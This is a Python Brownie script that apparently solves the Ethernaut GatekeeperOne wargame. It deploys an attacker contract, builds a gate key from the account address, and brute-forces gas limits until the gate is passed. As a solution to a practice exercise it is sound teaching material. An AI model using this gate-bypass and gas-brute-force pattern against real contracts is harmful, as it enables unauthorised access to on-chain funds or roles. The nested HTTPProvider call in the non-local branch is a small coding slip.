from brownie import Contract, Attack, GatekeeperOne, network, config
from scripts.helpful_scripts import get_account, LOCAL_BLOCKCHAIN_ENVIRONMENTS
from web3 import Web3


def attack():
    account = get_account()

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:

        web3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))

        gatekeeper = GatekeeperOne.deploy({"from": get_account(index=1)})

        attack = Attack.deploy(gatekeeper, {"from": account})

    else:

        web3 = Web3(
            Web3.HTTPProvider(
                Web3.HTTPProvider(config["networks"][network.show_active()]["infura"])
            )
        )

        gatekeeper = Contract.from_abi(
            GatekeeperOne._name,
            config["networks"][network.show_active()]["gatekeeper"],
            GatekeeperOne.abi,
        )

        attack = Attack.deploy(gatekeeper, {"from": account})

    gatekey = "0x" + "1" * 8 + "0" * 4 + str(account)[-4:]

    print(f"Gatekey is {gatekey}")

    for i in range(134572, 134572 + 8191):
        try:
            attack.attack(gatekey, {"from": account, "gas_limit": str(i)}).wait(1)
            print(f"gas_limit {str(i)} worked!")
        except Exception as e:
            print(f"gas_limit {str(i)} failed")

    print(f"GatekeeperOne entrant is {gatekeeper.entrant()}")


def main():
    attack()
